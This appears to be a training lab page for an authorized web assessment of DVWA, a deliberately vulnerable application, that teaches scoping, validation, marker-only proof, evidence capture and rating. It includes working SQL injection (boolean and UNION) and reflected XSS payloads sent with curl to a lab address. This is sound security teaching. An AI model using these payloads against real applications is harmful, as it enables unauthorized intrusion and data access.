---
title: "LAB-501-02 · Authorized Assessment of a Lab Target"
description: "Assess a deliberately vulnerable local application: enumerate, validate three findings, prove one impact with a marker, and rate with evidence."
module_code: CYB-501
level: 5
kind: lab
prerequisites: [CYB-501]
estimated_minutes: 240
difficulty: advanced
safety: isolated-vm
lab_ids: [LAB-501-02]
version: 1.0.0
last_reviewed: 2026-10-29
reviewers: []
status: published
tags: [web-assessment, validation, evidence, cvss, dvwa, authorized-testing]
---

# LAB-501-02 · Authorized Assessment of a Lab Target

## Scenario and background

The scope from LAB-501-01 covers one application on `192.0.2.50:4280`. You have two days, a rate limit and a rule
against dumping data. Your job is to find, **validate**, and prove impact for a small number of issues — then stop.

The target is DVWA, a deliberately vulnerable application you already built in Level 3. It contains synthetic users
and no real data. That is exactly why it is appropriate for practising the discipline rather than the exploitation.

## Learning objectives

1. Reconnoitre and enumerate a web application within a stated scope and rate limit.
2. Validate candidate findings manually instead of trusting a scanner.
3. Prove impact with a marker rather than by extracting data.
4. Capture evidence that a second tester could reproduce.
5. Rate findings technically and contextually, and state coverage limits.

## Required tools and versions

| Tool | Version | Notes |
| --- | --- | --- |
| DVWA | current release via its Compose file | `192.0.2.50:4280`, security level **low** for the exercise |
| `curl` | 8.x | Reproducible requests and evidence capture |
| `nmap` | 7.9x | Service identification, rate-limited |
| Browser + proxy (optional) | current / Burp Community 2026.10.1 | Visual confirmation |
| `jq` | 1.6+ | Formatting JSON evidence, if used |

!!! warning "Authorized scope — read before you begin"
    **Only `192.0.2.50:4280` and its DVWA paths are in scope.** Do not test `192.0.2.30` (the SIEM), the hypervisor,
    or anything outside the host-only network. Do not run load tests, fuzzers at high rate, or authentication attacks
    beyond the three validation attempts described.

    **Do not extract data.** A single marker value proves the injection. Dumping the user table exceeds the brief and
    teaches the wrong habit.

    Full rules: [Safety Policy](../../../policies/safety-policy.md).

## Threat model

A low-privilege authenticated user with access to the application's input points. The assessment asks whether that
user can read data they should not, execute script in another user's browser, or obtain a session that survives
theft. Those three questions bound the testing.

## Before you start

1. Confirm the lab is isolated: `ping -c1 8.8.8.8` must fail from `lab-web`.
2. Confirm DVWA is running and reachable only from the lab network.
3. Create `~/lab501/evidence/` and a `session.md` recording start time (UTC), scope reference, and tool versions.

## Procedure

### 1. Reconnaissance (rate-limited)

```bash
cd ~/lab501/evidence
date -u +%FT%TZ | tee recon-start.txt
curl -sS -D headers.txt -o body.html http://192.0.2.50:4280/
grep -iE '^(server|x-powered-by|set-cookie|content-type)' headers.txt | tee fingerprint.txt
sudo nmap -sV -Pn -p 4280 --max-rate 50 192.0.2.50 -oN nmap.txt
```

**Expected:** an Apache/PHP stack, a `PHPSESSID` cookie, and a single open port. The fingerprint informs the test
plan; it is not a finding by itself.

### 2. Enumerate the application

Log in through the UI (default DVWA credentials are documented in its setup page), set **DVWA Security → Low**, then
inventory the input points you will test:

| Endpoint | Parameter | Candidate class |
| --- | --- | --- |
| `/vulnerabilities/sqli/` | `id` | SQL injection |
| `/vulnerabilities/xss_r/` | `name` | Reflected XSS |
| `/vulnerabilities/xss_s/` | `mtxMessage` | Stored XSS |

Keep the session cookie in a variable, not in your notes:

```bash
read -rsp "PHPSESSID: " PHPSESSID; echo
COOKIE="PHPSESSID=$PHPSESSID; security=low"
curl -sS -b "$COOKIE" "http://192.0.2.50:4280/vulnerabilities/sqli/?id=1&Submit=Submit" -o sqli-baseline.html
grep -oE 'First name: [^<]+' sqli-baseline.html | head -2
```

**Expected:** one user's first name. Record the response hash, not the cookie:

```bash
sha256sum sqli-baseline.html | tee sqli-baseline.sha256
```

### 3. Validate SQL injection

Test a true and a false condition. The difference must be in the **result set**, not in an error page:

```bash
curl -sS -b "$COOKIE" "http://192.0.2.50:4280/vulnerabilities/sqli/?id=1%27%20AND%20%271%27%3D%271&Submit=Submit" -o sqli-true.html
curl -sS -b "$COOKIE" "http://192.0.2.50:4280/vulnerabilities/sqli/?id=1%27%20AND%20%271%27%3D%272&Submit=Submit" -o sqli-false.html
grep -c 'First name:' sqli-true.html sqli-false.html
```

**Expected:** the true condition returns a row; the false condition returns none. That is validation: the parameter
changes the query's logic.

Now prove impact with a marker, not a data dump:

```bash
curl -sS -b "$COOKIE" "http://192.0.2.50:4280/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20%27LAB501%27,%27MARKER%27--%20-&Submit=Submit" -o sqli-proof.html
grep -oE 'LAB501|MARKER' sqli-proof.html | sort -u | tee sqli-proof.txt
sha256sum sqli-proof.html >> sqli-proof.txt
```

**Expected:** `LAB501` and `MARKER` appear as a returned row. **Stop here.** Do not enumerate tables, columns or
password hashes.

**If it does not reproduce:** DVWA's query may expect a different column count in your version. Record the attempt,
adjust once, and if it still fails, mark it "potential — not reproduced" rather than claiming a finding.

### 4. Validate reflected XSS

```bash
PAYLOAD='%3Cscript%3Ealert(%22LAB501%22)%3C/script%3E'
curl -sS -b "$COOKIE" "http://192.0.2.50:4280/vulnerabilities/xss_r/?name=$PAYLOAD" -o xss.html
grep -o '<script>alert("LAB501")</script>' xss.html | tee xss-proof.txt
```

**Expected:** the script tag appears unencoded in the response. That demonstrates the encoding failure; the browser
alert is confirmation, not the evidence.

**Validate the negative:** submit the same string with `<` encoded as `&lt;` in the request. If the response now shows
`&lt;script&gt;`, the application encodes on that path, and your first result is the exception rather than the rule.

### 5. Evaluate session cookie attributes

```bash
curl -sS -D - -o /dev/null http://192.0.2.50:4280/login.php | grep -i '^set-cookie' | tee cookie.txt
```

**Expected:** `PHPSESSID` without `HttpOnly`, `Secure` or `SameSite` in the default DVWA configuration.

**Rate this carefully.** Missing attributes are a real weakness, but the impact depends on whether an XSS exists on
the same origin — which you have just shown it does. Write the combined chain rather than two unrelated findings.

### 6. Clean up and record coverage

- Remove any stored XSS entry you created (DVWA guestbook) and empty it.
- Log out; do not leave the session open.
- Record what you did **not** test: file upload, command injection, CSRF, authentication brute force, the API host.

`cleanup.md`:

```text
Started (UTC):       …
Finished (UTC):      …
Artefacts created:   one guestbook entry (removed at …)
Accounts used:       admin (DVWA default, lab only)
Rate limit observed: <= 5 req/s
Out-of-scope items tested: none
```

### 7. Evidence pack and findings

`findings.md` — one section per finding:

| Field | Requirement |
| --- | --- |
| Title | Specific: "Boolean-based SQL injection in `id` parameter" |
| Rating | CVSS v4.0 vector + score, plus contextual rating |
| Affected | URL, parameter, account role |
| Reproduction | The three commands, in order, with expected output |
| Evidence | File names and hashes; cookie redacted |
| Impact | What an attacker gains, in this environment |
| Remediation | Specific change, with verification method |
| References | CWE, OWASP category |

**Expected findings:** SQL injection (confirmed), reflected XSS (confirmed), session cookie weaknesses (confirmed,
chained). Rating differences from a "real" deployment must be explained: the lab has synthetic data and no WAF, so
the contextual rating is lower than the technical score while the chain remains serious.

## Evidence to collect

- `session.md`, `recon-start.txt`, `headers.txt`, `fingerprint.txt`, `nmap.txt`.
- `sqli-baseline.*`, `sqli-true.html`, `sqli-false.html`, `sqli-proof.html`, `sqli-proof.txt`.
- `xss.html`, `xss-proof.txt`.
- `cookie.txt` with the session identifier redacted.
- `cleanup.md`, `findings.md` with CVSS vectors.

## Verification

- [ ] Every request stays inside `192.0.2.50:4280` and the stated rate limit.
- [ ] SQL injection validated with a true/false pair before any proof.
- [ ] Impact proven with a marker; no data dumped.
- [ ] XSS evidence is the unencoded response, with a negative comparison.
- [ ] Cookie finding is chained to the XSS rather than rated in isolation.
- [ ] Evidence hashes recorded and the cookie redacted.
- [ ] Cleanup performed and out-of-scope areas listed.
- [ ] Ratings show both vector and contextual reasoning.

## Teardown and reset

Revert `lab-web` to its pre-lab snapshot, or remove the guestbook entry and log out. Keep the evidence directory
outside the VM.

## Reflection

1. Your SQL injection is "authenticated". Why does that change the rating, and what would change it back?
2. You stopped at a marker. Describe the exact point where continuing would have exceeded the brief.
3. The cookie finding alone is moderate; with the XSS it is worse. How do you present a chain without double-counting?
4. Which untested area would you prioritise on a second day, and what would you need to add to the scope first?

## Rubric

| Criterion | 1 — Incomplete | 3 — Competent | 5 — Proficient |
| --- | --- | --- | --- |
| Recon | Port scan only | Fingerprint and inventory | Inventory tied to test plan and scope |
| Validation | Scanner claim accepted | Manual reproduction | True/false controls and negative comparisons |
| Restraint | Data extracted | Marker used | Marker plus explicit stop point and cleanup |
| Reporting | List of issues | Findings with ratings | Vector, context, chain, coverage limits |

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Redirected to login on every request | Missing or stale `PHPSESSID`, or security level reset | Re-authenticate; set security to low; pass both cookies |
| SQLi true/false both return rows | Payload encoding wrong | URL-encode `'` as `%27` and spaces as `%20`; check the exact query |
| UNION returns an error | Column count mismatch | Determine the column count with `ORDER BY` before the union |
| XSS payload appears encoded | Application escapes on that path | Test a different context; record the encoding as a positive control |
| No `Set-Cookie` header | Session already established | Use a fresh cookie jar or `-c`/`-b` files |
| Findings feel thin | Scope was genuinely narrow | Report the limits; a short validated report beats a long speculative one |

## References

1. OWASP WSTG v4.2 — SQL injection, XSS and session testing. Accessed 2026-10-29.
2. OWASP Top 10:2025 — injection and broken access control. Accessed 2026-10-29.
3. FIRST — CVSS v4.0 specification and calculator. <https://www.first.org/cvss/v4-0/> Accessed 2026-10-29.
4. CWE-89, CWE-79, CWE-1004. <https://cwe.mitre.org/> Accessed 2026-10-29.
5. DVWA documentation. Accessed 2026-10-29.
